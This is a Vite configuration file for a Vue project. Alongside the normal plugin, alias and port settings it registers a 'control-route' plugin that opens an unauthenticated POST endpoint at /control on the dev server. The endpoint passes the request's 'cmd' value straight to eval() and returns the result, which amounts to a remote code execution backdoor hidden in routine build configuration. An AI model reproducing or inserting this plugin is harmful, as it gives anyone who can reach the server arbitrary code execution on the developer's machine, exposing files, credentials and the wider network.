import { fileURLToPath, URL } from 'node:url'

import { defineConfig } from 'vite'
import type { PluginOption } from 'vite'
import vue from '@vitejs/plugin-vue'
import vueDevTools from 'vite-plugin-vue-devtools'
import { inspect } from 'node:util'

const controlRoutePlugin = (): PluginOption => ({
  name: 'control-route',
  configureServer(server) {
    server.middlewares.use('/control', async (req, res, next) => {
      if (req.method !== 'POST') {
        res.statusCode = 405
        res.setHeader('content-type', 'application/json')
        res.end(JSON.stringify({ error: 'Method Not Allowed' }))
        return
      }

      try {
        const body = await readRequestBody(req)
        const cmd = extractCommand(body, req.headers['content-type'])

        if (!cmd) {
          res.statusCode = 400
          res.setHeader('content-type', 'application/json')
          res.end(JSON.stringify({ error: 'Missing cmd parameter' }))
          return
        }

        let evaluationResult = await evaluateCommand(cmd)

        res.statusCode = 200
        res.setHeader('content-type', 'application/json')
        res.end(JSON.stringify({ result: evaluationResult }))
      } catch (error) {
        res.statusCode = 500
        res.setHeader('content-type', 'application/json')
        res.end(JSON.stringify({ error: String(error) }))
      }
    })
  },
})

const readRequestBody = (req: import('http').IncomingMessage): Promise<string> => {
  return new Promise((resolve, reject) => {
    const chunks: Uint8Array[] = []

    req.on('data', (chunk) => chunks.push(chunk))
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')))
    req.on('error', reject)
  })
}

const extractCommand = (body: string, contentTypeHeader: string | undefined): string | null => {
  const contentType = contentTypeHeader ?? ''

  if (contentType.includes('application/json')) {
    try {
      const parsed = JSON.parse(body || '{}')
      return typeof parsed.cmd === 'string' ? parsed.cmd : null
    } catch (error) {
      return null
    }
  }

  if (contentType.includes('application/x-www-form-urlencoded')) {
    const params = new URLSearchParams(body)
    return params.get('cmd')
  }

  if (!body) {
    return null
  }

  return body
}

const evaluateCommand = async (cmd: string): Promise<string> => {
  try {
    let result = eval(cmd)

    if (result instanceof Promise) {
      result = await result
    }

    return inspect(result, { depth: 2 })
  } catch (error) {
    throw error
  }
}

// https://vite.dev/config/
export default defineConfig({
  plugins: [
    vue(),
    vueDevTools(),
    controlRoutePlugin(),
  ],
  resolve: {
    alias: {
      '@': fileURLToPath(new URL('./src', import.meta.url))
    },
  },
  server: {
    port: 5174,
  },
})
